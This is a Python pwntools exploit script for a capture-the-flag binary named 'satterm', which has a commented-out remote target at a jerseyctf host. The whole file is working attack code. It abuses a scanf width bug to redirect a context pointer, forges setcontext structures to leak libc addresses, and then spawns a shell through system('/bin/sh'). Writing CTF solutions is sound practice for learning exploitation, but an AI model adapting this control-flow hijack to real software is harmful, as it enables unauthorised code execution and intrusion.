#!/usr/bin/env python3
from pwn import *
import warnings

warnings.filterwarnings("ignore")

context.binary = exe = ELF("./satterm_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# context.log_level = "debug"

INPUT = exe.sym.input
MAIN_CTX = exe.sym.main_ctx
MAIN_CTX_RSP = MAIN_CTX + 0xA0
PUTS_GOT = exe.got.puts
PUTS_PLT = exe.plt.puts

# operation_status+0x7f:
#   lea rax, [main_ctx]
#   mov rdi, rax
#   call setcontext@plt
RESUME_MAIN = 0x4013D9

OFF_FPREGS = 0xE0
OFF_MXCSR = 0x1C0
OFF_FPSTATE = 0x1A8
OFF_R8 = 0x28
OFF_R9 = 0x30
OFF_R12 = 0x48
OFF_R13 = 0x50
OFF_R14 = 0x58
OFF_R15 = 0x60
OFF_RDI = 0x68
OFF_RSI = 0x70
OFF_RBP = 0x78
OFF_RBX = 0x80
OFF_RDX = 0x88
OFF_RCX = 0x98
OFF_RSP = 0xA0
OFF_RIP = 0xA8


def start():
    return process([exe.path])
    # return remote('sat-term.aws.jerseyctf.com', 5000)



def build_ctx(rip, *, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0,
              rsp=INPUT + 0x3C8, ret_addr=RESUME_MAIN):
    buf = bytearray(b"Z" * 0x3D0)

    # setcontext() executes fldenv [uc_mcontext.fpregs] and ldmxcsr [ctx+0x1c0]
    buf[OFF_FPREGS:OFF_FPREGS + 8] = p64(INPUT + OFF_FPSTATE)
    buf[OFF_FPSTATE + 0:OFF_FPSTATE + 2] = p16(0x037F)
    buf[OFF_FPSTATE + 2:OFF_FPSTATE + 4] = p16(0xFFFF)
    buf[OFF_FPSTATE + 4:OFF_FPSTATE + 6] = p16(0x0000)
    buf[OFF_FPSTATE + 6:OFF_FPSTATE + 8] = p16(0xFFFF)
    buf[OFF_MXCSR:OFF_MXCSR + 4] = p32(0x1F80)

    for off, val in [
        (OFF_R8, r8),
        (OFF_R9, r9),
        (OFF_R12, 0),
        (OFF_R13, 0),
        (OFF_R14, 0),
        (OFF_R15, 0),
        (OFF_RDI, rdi),
        (OFF_RSI, rsi),
        (OFF_RBP, 0),
        (OFF_RBX, 0),
        (OFF_RDX, rdx),
        (OFF_RCX, rcx),
        (OFF_RSP, rsp),
        (OFF_RIP, rip),
    ]:
        buf[off:off + 8] = p64(val)

    buf[0x3C8:0x3D0] = p64(ret_addr)
    return bytes(buf)


def overwrite_contexts_to_input(p):
    p.sendlineafter(b"> ", b"SETTINGS")
    p.sendlineafter(b"CHANGE [Y/N]: ", b"Y")
    p.sendlineafter(b"APOAPSIS: ", b"1")
    p.sendlineafter(b"PERIAPSIS: ", b"1")
    p.sendlineafter(b"ORBIT INCLINE: ", b"1")

    # scanf("%lu", &nav_data.sync_ms) writes 8 bytes at nav_data+0x1c.
    # The upper 4 bytes of that write become the low 4 bytes of contexts.
    p.sendlineafter(
        b"DOWNLINK SYNCHRONIZATION MS: ",
        str(INPUT << 32).encode(),
    )
    p.sendlineafter(b"SATELLITE SAFE MODE [Y/N]: ", b"Y")

    # scanf leaves a trailing newline, so main prints two prompts.
    p.recvuntil(b"> ")
    p.recvuntil(b"> ")


def leak_ptr(p, addr):
    payload = b"STATUS\n" + build_ctx(PUTS_PLT, rdi=addr)[7:]
    p.send(payload)
    p.recvuntil(b"COMMAND STATUS\n")
    blob = p.recvuntil(b"> ", drop=True)
    return u64(blob.rstrip(b"\n").ljust(8, b"\x00"))


def main():
    p = start()

    overwrite_contexts_to_input(p)

    puts_addr = leak_ptr(p, PUTS_GOT)
    libc.address = puts_addr - libc.sym.puts
    log.info(f"puts@libc = {puts_addr:#x}")
    log.info(f"libc base = {libc.address:#x}")

    stack_addr = leak_ptr(p, MAIN_CTX_RSP)
    real_rsp = stack_addr + 8
    log.info(f"saved main rsp = {stack_addr:#x}")
    log.info(f"system rsp = {real_rsp:#x}")

    ctx = bytearray(build_ctx(
        libc.sym.system,
        rdi=INPUT + 0x300,
        rsp=real_rsp,
    ))
    ctx[0x300:0x308] = b"/bin/sh\x00"

    p.send(b"STATUS\n" + bytes(ctx)[7:])
    p.recvuntil(b"COMMAND STATUS\n")
    p.interactive()


if __name__ == "__main__":
    main()